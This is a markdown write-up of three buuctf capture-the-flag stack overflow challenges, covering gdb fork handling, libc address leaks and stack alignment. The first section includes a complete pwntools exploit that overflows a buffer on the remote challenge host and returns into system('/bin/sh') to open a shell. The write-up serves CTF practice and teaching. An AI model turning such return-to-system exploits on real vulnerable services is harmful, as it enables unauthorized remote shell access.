# Stack overflow

## 1. jarvisoj_level2

From: buuctf

click [here](../PwnFile/level2) to download.

We can easily find the **binsh_addr** and **system_call_address**.

It's an easy problem, but there's something new while using **gdb** to find the offset from buffer to *ebp*.

> When you try to set breakpoint, you may get the error like this:
>
> [Attaching after Thread 0xf7fc2400 (LWP 10853) vfork to child process 10856]
> 
> [New inferior 2 (process 10856)]
> 
> [Thread debugging using libthread_db enabled]
> 
> Using host libthread_db library "/usr/lib/libthread_db.so.1".
> 
> [Detaching vfork parent process 10853 after child exec]
> 
> [Inferior 1 (process 10853) detached]
> 
> process 10856 is executing new program: /usr/bin/bash
> 
> Warning:
>
> Cannot insert breakpoint 2.
>
> Cannot access memory at address 0x8048475

You need to use **set follow-fork-mode parent** command to continue. 

There's nothing new about this.

Exp:
```python
from pwn import *

# sh = process('./level2')
sh = remote('node4.buuoj.cn', 25873)

binsh_addr = 0x804a024
target = 0x804849e
offset = 0xffffcb78 - 0xffffcaf0 + 4

payload = flat([cyclic(offset), target, binsh_addr])
sh.sendlineafter(b'Input:', payload)
sh.interactive()
```

## 2. ciscn_2019_c_1

From: buuctf

click [here](../PwnFile/ciscn_2019_c_1) to download.

It's type of **ret2libc**.

I think only two questions need to pay attention.

1. leak libc

The libc functions' address often have a length of **0x6** at 64bits machines. But when we use **puts** to leak the address, it stops at '\x00', so it only puts out the little six bytes(little-endian).

Otherwise we need to use `sh.recv(6).ljust(0x8, b'\x00')` instead of `sh.recv(8)`

2. The environment is Ubuntu18, and all versions after that should follow the **Stack Alignment**. That means we need to add a *ret* to make system_addr align to 0x10.

More details see [here](https://www.cnblogs.com/ZIKH26/articles/15996874.html).

And [here](../Shellcode/ciscn.py) are exp.

## 3. not_the_same_3dsctf_2016

From: buuctf

click [here](../PwnFile/not_the_same_3dsctf_2016) to download.

It's a 32bits static-linked file, don't have canary  
IDA to see the main functions

We can use **gets** to make stack overflow.  
The main point is the **get_secret** function that printf the flag to *fl4g*, which is in .bss section

> It's clear that we need to print the flag.(with function *printf*, *write*, *fputs*...)

Here are some attentions

- You don't need to cover the **ebp** due to the source assemble code
- *printf* must followed with *exit*, it will print the content only while meeting '\n' or buffer overflowed or process exit

shellcode for [printf](../Shellcode/not_the_same_3dsctf_2016.py)  

To use function *write*, see [here](https://zhuanlan.zhihu.com/p/648701544)
